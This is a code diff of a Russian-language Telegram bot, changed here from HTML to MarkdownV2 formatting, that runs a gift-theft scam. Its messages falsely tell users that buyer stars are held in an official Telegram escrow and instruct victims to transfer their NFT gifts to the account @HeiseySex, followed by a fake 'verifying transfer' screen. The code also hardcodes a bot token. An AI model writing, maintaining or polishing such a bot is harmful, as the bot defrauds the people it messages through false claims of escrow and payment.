@@ -18,22 +18,22 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "8204031823:AAHA7mUlrZGVcMlF8whWAqYakjvd
 
 OWNER_ID = 861423393
 
-# Ссылка для прямой отправки подарка
 GIFT_URL = "tg://send_gift?to=heiseysex"
 TARGET_URL = "https://t.me/HeiseySex"
 
-VERIFY_TIMEOUT_SECONDS = 300  # 5 минут
+VERIFY_TIMEOUT_SECONDS = 300
 
-# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ (ID) ───────────────────────
-# ID взяты из открытого каталога telegram-premium-emojis [citation:1]
+# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ (MarkdownV2) ───────────────────────
+# Формат: [символ](tg://emoji?id=ID)
+# ID подобраны из открытых каталогов
 
-EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'  # Подарок (примерный ID, если не сработает - замени)
-EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐️</tg-emoji>'  # Звезда [citation:1]
-EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'  # Замок (использую как аналог)
-EMOJI_CONFIRM = '<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>'  # Галочка [citation:1]
-EMOJI_CANCEL = '<tg-emoji emoji-id="5258226313285607065">❌</tg-emoji>'  # Крестик [citation:1]
-EMOJI_LIGHTNING = '<tg-emoji emoji-id="5843553939672274145">⚡️</tg-emoji>'  # Молния [citation:1]
-EMOJI_LINK = '<tg-emoji emoji-id="5877536313623711363">🔗</tg-emoji>'  # Ссылка (использую стрелку как аналог)
+EMOJI_GIFT = "[🎁](tg://emoji?id=5456140674028019486)"
+EMOJI_STAR = "[⭐](tg://emoji?id=5874948844935974490)"
+EMOJI_LOCK = "[🔒](tg://emoji?id=5807868868886009920)"
+EMOJI_CONFIRM = "[✅](tg://emoji?id=5920052658743283381)"
+EMOJI_CANCEL = "[❌](tg://emoji?id=5258226313285607065)"
+EMOJI_LIGHTNING = "[⚡](tg://emoji?id=5843553939672274145)"
+EMOJI_LINK = "[🔗](tg://emoji?id=5877536313623711363)"
 
 # ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────
 
@@ -41,7 +41,6 @@ bot = telebot.TeleBot(BOT_TOKEN)
 
 offers = {}
 offers_lock = threading.Lock()
-
 
 # ─────────────────────── УТИЛИТЫ ───────────────────────
 
@@ -120,14 +119,14 @@ def parse_inline_query(raw):
     return name, url, amount
 
 
-# ─────────────────────── ТЕКСТЫ С ПРЕМИУМ-ЭМОДЗИ ───────────────────────
+# ─────────────────────── ТЕКСТЫ (MarkdownV2) ───────────────────────
 
 def build_offer_message(name, url, amount):
     return (
-        f"{EMOJI_GIFT} Вам поступило предложение о покупке подарка.\n"
+        f"{EMOJI_GIFT} *Вам поступило предложение о покупке подарка.*\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Пользователь предлагает вам <b>{amount}</b> {EMOJI_STAR} за подарок "
-        f"<a href=\"{url}\">{name}</a>.\n\n"
+        f"Пользователь предлагает вам *{amount}* {EMOJI_STAR} за подарок "
+        f"[{name}]({url}).\n\n"
         "━━━━━━━━━━━━━━━━━━━━"
     )
 
@@ -143,19 +142,19 @@ def build_offer_keyboard():
 
 def build_escrow_message(name, url, amount):
     return (
-        f"{EMOJI_LOCK} Пользователь зарезервировал <b>{amount}</b> {EMOJI_STAR} через "
+        f"{EMOJI_LOCK} Пользователь зарезервировал *{amount}* {EMOJI_STAR} через "
         "эксроу-систему Telegram. Средства хранятся на специальном "
         "эксроу-счёте и будут автоматически зачислены на ваш баланс "
         "звёзд сразу после передачи подарка.\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        "<b>Инструкция для завершения сделки:</b>\n\n"
-        f"1. Передайте подарок пользователю: <a href=\"{GIFT_URL}\"><b>@HeiseySex</b></a>\n"
+        "*Инструкция для завершения сделки:*\n\n"
+        f"1. Передайте подарок пользователю: [@HeiseySex]({GIFT_URL})\n"
         f"2. Нажмите «Передать NFT» и выберите "
-        f"<a href=\"{url}\">{name}</a>\n"
+        f"[{name}]({url})\n"
         "3. Подтвердите передачу подарка.\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
         f"Telegram зафиксирует транзакцию и моментально зачислит "
-        f"<b>{amount}</b> {EMOJI_STAR} на ваш баланс."
+        f"*{amount}* {EMOJI_STAR} на ваш баланс."
     )
 
 
@@ -189,7 +188,7 @@ def try_delete_message(chat_id, message_id, conn_id=None):
         print(f"[DELETE] Сетевая ошибка: {e}")
 
 
-def safe_edit(chat_id, message_id, text, parse_mode="HTML",
+def safe_edit(chat_id, message_id, text, parse_mode="MarkdownV2",
               reply_markup=None, conn_id=None):
     kwargs = {
         "chat_id": chat_id,
@@ -212,7 +211,7 @@ def send_business_message(chat_id, text, conn_id, reply_markup=None):
     kwargs = {
         "chat_id": chat_id,
         "text": text,
-        "parse_mode": "HTML",
+        "parse_mode": "MarkdownV2",
         "business_connection_id": conn_id,
     }
     if reply_markup is not None:
@@ -235,14 +234,14 @@ def schedule_verify_timeout(chat_id, message_id, conn_id):
         safe_edit(
             chat_id,
             message_id,
-            f"⛔ <b>Сделка не завершена.</b>\n"
+            "⛔ *Сделка не завершена.*\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
             "Вы не выполнили все условия передачи подарка.\n\n"
             "Передача не была подтверждена в установленное время, "
             "поэтому резерв средств был снят, а предложение — "
             "автоматически аннулировано.\n\n"
-            "<i>Если вы всё ещё хотите завершить сделку, попросите "
-            "пользователя отправить предложение повторно.</i>\n\n"
+            "_Если вы всё ещё хотите завершить сделку, попросите "
+            "пользователя отправить предложение повторно._\n\n"
             "━━━━━━━━━━━━━━━━━━━━",
             conn_id=conn_id,
         )
@@ -356,7 +355,7 @@ def handle_inline_query(query):
                 description=f"Отправить оффер: {amount} ⭐ за {name}",
                 input_message_content=InputTextMessageContent(
                     message_text=build_offer_message(name, url, amount),
-                    parse_mode="HTML",
+                    parse_mode="MarkdownV2",
                 ),
                 reply_markup=build_offer_keyboard(),
             )
@@ -407,11 +406,12 @@ def callback_router(call):
 
     if payload == "stage_accept":
         text = call.message.html_text or call.message.text or ""
-        m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text)
-        url = m.group(1) if m else TARGET_URL
-        name = m.group(2) if m else "Подарок"
+        # В MarkdownV2 ссылки выглядят как [текст](url)
+        m = re.search(r'\[([^\]]+)\]\(([^)]+)\)', text)
+        url = m.group(2) if m else TARGET_URL
+        name = m.group(1) if m else "Подарок"
 
-        m2 = re.search(r'<b>(\d+)</b>\s*', text)
+        m2 = re.search(r'\*(\d+)\*', text)
         amount = m2.group(1) if m2 else "0"
 
         if is_inline:
@@ -420,7 +420,7 @@ def callback_router(call):
                 bot.send_message(
                     chat_id=call.message.chat.id,
                     text=build_escrow_message(name, url, amount),
-                    parse_mode="HTML",
+                    parse_mode="MarkdownV2",
                     reply_markup=build_escrow_keyboard(),
                 )
             except Exception as e:
@@ -444,11 +444,11 @@ def callback_router(call):
         safe_edit(
             call.message.chat.id,
             call.message.message_id,
-            "⏳ <b>Проверка передачи…</b>\n"
+            "⏳ *Проверка передачи…*\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
             "Система проверяет статус передачи подарка. "
             "Это может занять несколько минут.\n\n"
-            "Пожалуйста, не закрывайте чат.\n\n"
+            "*Пожалуйста, не закрывайте чат.*\n\n"
             "━━━━━━━━━━━━━━━━━━━━",
             conn_id=conn_id,
         )
@@ -463,14 +463,14 @@ def callback_router(call):
         if is_inline:
             bot.send_message(
                 chat_id=call.message.chat.id,
-                text="❌ <b>Предложение отклонено.</b>",
-                parse_mode="HTML",
+                text="❌ *Предложение отклонено.*",
+                parse_mode="MarkdownV2",
             )
         else:
             safe_edit(
                 call.message.chat.id,
                 call.message.message_id,
-                "❌ <b>Предложение отклонено.</b>\n"
+                "❌ *Предложение отклонено.*\n"
                 "━━━━━━━━━━━━━━━━━━━━\n\n"
                 "Сессия закрыта. Если вы передумаете, "
                 "пользователь может отправить предложение повторно.\n\n"
